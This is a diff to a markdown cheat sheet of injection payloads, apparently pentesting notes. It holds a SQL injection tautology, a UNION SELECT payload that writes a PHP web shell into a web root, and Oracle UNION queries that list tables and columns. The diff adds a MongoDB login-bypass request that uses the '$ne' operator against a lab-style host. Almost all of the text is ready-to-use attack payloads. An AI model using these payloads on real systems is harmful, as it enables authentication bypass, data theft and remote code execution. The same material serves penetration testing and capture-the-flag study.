@@ -70,15 +70,31 @@ www.example.com/xxx.php?id=1 or 1=1
 ```
 
 ## RCE with UNION
-
 ```
 123' UNION SELECT '<?php echo system("ls -la /");?>','2','3','4','5' into outfile '/var/www/html/shell.php'#
 ```
 
 ## Oracle DB
-
 ```
 ' UNION SELECT table_name,null,null FROM all_tables--
 ' UNION SELECT  column_name,null,null FROM all_tab_columns WHERE table_name=''--
 ' UNION SELECT [col1],[col2],null FROM [table]--
+```
+
+## MongoDB
+```
+POST /login HTTP/1.1
+Host: 10.10.11.139:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 43
+Origin: http://10.10.11.139:5000
+Connection: close
+Referer: http://10.10.11.139:5000/login
+Upgrade-Insecure-Requests: 1
+
+{"user":"admin","password":{"$ne":"admin"}}
 ```
